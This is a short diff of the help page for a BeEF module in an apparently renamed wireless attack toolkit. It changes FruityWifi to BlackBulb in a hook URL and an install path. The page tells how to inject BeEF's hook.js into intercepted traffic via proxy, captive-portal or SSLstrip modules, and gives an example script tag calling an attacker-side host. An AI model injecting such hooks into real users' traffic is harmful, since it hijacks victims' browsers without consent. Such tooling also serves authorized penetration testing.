@@ -9,14 +9,14 @@ Amid growing concerns about web-borne attacks against clients, including mobile 
 <br>
 <b>Note</b>: use FruityProxy, Captive, or SSLstrip (inject) modules to inject <b>hook.js</b>:
 <br><br>
-<font face="monospace">http://{FruityWifi-IP}:3000/hook.js</font>
+<font face="monospace">http://{BlackBulb-IP}:3000/hook.js</font>
 <br><br>
 <b>Example</b>: <font face="monospace">&lt;script src=&quot;http://10.0.0.1:3000/hook.js&quot;&gt;&lt;/script&gt;</font>
 <br>
 <br>
 <b>BeEF Install</b>:
 <font face="monospace">
-<br>cd /usr/share/fruitywifi/www/modules/beef/includes
+<br>cd /usr/share/blackbulb/www/modules/beef/includes
 <br>chmod 755 install.sh
 <br>./install.sh
 </font>
